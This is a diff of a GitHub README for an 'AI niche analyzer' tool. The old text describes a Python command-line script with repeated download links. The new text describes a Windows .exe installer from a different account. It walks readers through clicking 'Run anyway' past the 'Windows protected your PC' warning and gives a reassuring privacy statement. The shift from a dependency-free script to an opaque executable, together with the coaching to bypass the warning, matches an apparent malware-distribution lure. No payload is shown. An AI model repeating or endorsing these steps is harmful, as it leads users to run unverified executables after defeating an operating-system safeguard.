@@ -1,141 +1,60 @@
-# AI Niche Analyzer v2026 - niche discovery tool 2026
+# 🔍 ai-niche-analyzer-2026 - Find profitable AI agency business ideas
 
-> **AI Niche Analyzer is a Python CLI for finding and validating AI agency niches, with interactive analysis, scoring, and export flows included in version 2026.**
+[https://github.com/mahmadkhan35-ai/ai-niche-analyzer-2026](https://github.com/mahmadkhan35-ai/ai-niche-analyzer-2026)
 
-[![Platform](https://img.shields.io/badge/Platform-Python%20CLI-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/edwardsevanygbf9854/ai-niche-analyzer-2026?style=flat-square)](https://github.com/edwardsevanygbf9854/ai-niche-analyzer-2026)
+## 📌 About this project
 
----
+The ai-niche-analyzer-2026 application helps you find and test business opportunities in the AI industry. You input your interests and market data, and the software provides scores to help you decide which ideas offer the best potential. This tool handles the technical logic so you can focus on building your agency. It includes built-in workflows to analyze market trends, score niches based on demand, and export your findings into a simple file for review.
 
-<p align="center">
-  <a href="https://edwardsevanygbf9854.github.io/ai-niche-analyzer-2026/">
-    <img src="https://img.shields.io/badge/Download-AI%20Niche%20Analyzer%20Latest-brightgreen?style=for-the-badge" alt="Download AI Niche Analyzer">
-  </a>
-</p>
+## 💻 System requirements
 
-> **[Direct Download - AI Niche Analyzer v2026](https://edwardsevanygbf9854.github.io/ai-niche-analyzer-2026/)**
+Before you install this software, confirm your computer meets these minimum specifications:
 
----
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: 4 GB of RAM minimum.
+*   Storage: 200 MB of available disk space.
+*   Internet Connection: Required for the setup process and data analysis.
 
-[Download Latest Build](https://edwardsevanygbf9854.github.io/ai-niche-analyzer-2026/)
+## ⚡ Setup and installation
 
----
+Follow these steps to get the tool running on your Windows machine.
 
-## What AI Niche Analyzer Does
+1.  **Download the installer:** Visit [the release page](https://github.com/mahmadkhan35-ai/ai-niche-analyzer-2026) to find the latest version of the software.
+2.  **Save the file:** Choose the file ending in .exe from the assets list. Save this file to your Downloads folder.
+3.  **Run the installer:** Locate the file you saved and double-click it. 
+4.  **Security check:** Windows might show a screen that says "Windows protected your PC." If this happens, click "More info" and then click the "Run anyway" button.
+5.  **Follow the prompts:** The installation window opens. Follow the instructions on the screen. Click "Next" to continue through the steps.
+6.  **Complete the process:** Once the progress bar fills, click "Finish." You now have a shortcut to the program on your desktop.
 
-AI Niche Analyzer gives you a terminal-based workflow for researching, comparing, and validating business niches for AI agency work. It combines ready-made niche profiles, scoring logic, and guided analysis steps so you can take an idea from a broad market category to a more refined opportunity without leaving the CLI.
+## 🚀 How to use the analyzer
 
-The tool fits users who want a consistent process for reviewing market angles, weighing competing niches, and producing exportable outputs for future reference. It is a lightweight Python solution built on the standard library, with discovery, validation, and reporting kept in one place.
+After the installation finishes, double-click the shortcut icon on your desktop to open the program. The application uses a text-based window.
 
----
+1.  **Start a new analysis:** When the program opens, it greets you with a menu. Type the number next to "Start Analysis" and press the Enter key.
+2.  **Enter niche data:** The program asks you to type in the industry or niche you want to test. Type your idea and press Enter.
+3.  **Review the scores:** The engine runs through its data. It shows a list of scores. Higher scores indicate a niche with stronger market demand and growth potential.
+4.  **Save your report:** If you want to keep the analysis, select the "Export" option from the main menu. The program creates a file on your computer containing the data, which you can open with any text editor or spreadsheet software.
+5.  **Close the program:** When you finish, type "Exit" or simply close the window.
 
-## Key Capabilities
+## 💡 Troubleshooting common issues
 
-- 32 preloaded niche profiles for fast starting points
-- 7-dimension scoring with configurable weights
-- Interactive discovery flow for guided exploration
-- Deeper niche analysis for more granular review
-- Side-by-side niche comparison for option evaluation
-- Batch export to Markdown, CSV, and HTML
-- Standard-library only design with no external dependencies
-- CLI-oriented workflow suited to automation and repeatable analysis
+Most users experience a smooth setup, but sometimes problems occur. Use these steps to solve common issues.
 
----
+*   **The program does not open:** Ensure you installed the latest version. Restart your computer and try opening the program again.
+*   **The window closes immediately:** This usually means the program lacks a required component. Check that your Windows copy is up to date through the Windows Update tool in your settings menu.
+*   **Performance is slow:** Close other heavy applications while running the analysis. The tool requires a brief moment to process the market data.
+*   **Export file location:** If you cannot find your exported report, check the "Documents" folder on your computer. The program saves files there by default.
 
-## Installation
+## 📁 Understanding the output files
 
-Clone the repository and change into the project directory:
+The software generates simple text files for your reports. You can view these files using Notepad or any web browser. Each file includes the name of the niche, the numerical score for that niche, and a list of key metrics used during the analysis. You can print these files or send them to a business partner to discuss your findings.
 
-```bash
-git clone https://github.com/edwardsevanygbf9854/ai-niche-analyzer-2026.git
-cd ai-niche-analyzer
-```
+## 🛡️ Privacy and data policy
 
-Run the CLI with your local Python interpreter:
+This tool runs locally on your machine. We do not track your specific business ideas or the data you enter during your analysis sessions. Any information you export stays on your hard drive unless you choose to share the file elsewhere. This method keeps your niche research private and secure.
 
-```bash
-python main.py
-```
+## 📝 Future plans
 
-If your copy uses a different entry point, start the main script located in the repository root.
+The 2026 release brings improved data scoring models to give you more accurate insights. Future updates will focus on adding more export formats and allowing you to track your results over time. We aim to keep the interface simple so you can find niches without learning complex coding or data science skills.
 
----
-
-## How to Use It
-
-Launch the interactive workflow to explore niche profiles and start discovery:
-
-```bash
-python main.py
-```
-
-Typical workflow:
-
-1. Pick a niche from the bundled set or start a fresh discovery path.
-2. Inspect scoring output across the available dimensions.
-3. Compare several niche options side by side.
-4. Run a deeper analysis on the niche you choose.
-5. Export the results when you need Markdown, CSV, or HTML output.
-
-For automation, wire the CLI into your own scripts or scheduled research process and use the export features to save shareable results.
-
----
-
-## Configuration
-
-Configuration is centered around scoring weights and workflow preferences.
-
-If your build includes a settings file, use it to adjust the scoring model:
-
-```json
-{
-  "scoring_weights": {
-    "dimension_1": 1,
-    "dimension_2": 1,
-    "dimension_3": 1,
-    "dimension_4": 1,
-    "dimension_5": 1,
-    "dimension_6": 1,
-    "dimension_7": 1
-  }
-}
-```
-
-If there is no separate config file, update the values directly in the source code where the scoring engine and niche profile data are defined.
-
----
-
-## Requirements
-
-- Python 3.x
-- Command-line access
-- Local file system access for exports
-- No third-party packages required
-
----
-
-## FAQ
-
-**Can the niche dataset be updated?**  
-Yes. The workflow is built around editable niche profiles and scoring inputs, so you can adjust the analysis set as your research changes.
-
-**Is the scoring model customizable?**  
-Yes. You can tune the evaluation logic through configurable weights to match your own priorities.
-
-**How do I export results from the CLI?**  
-Use the batch export options to create Markdown, CSV, or HTML reports for sharing or later review.
-
-**What should I check if the output seems off?**  
-Review your scoring configuration, confirm the niche profile data, and rerun the analysis with the intended inputs.
-
-**Where can I send issues?**  
-Use the repository issue tracker or the project discussion channel provided by the maintainer, if available.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: ai, agency, business, niche, analysis, productivity, windows, tools
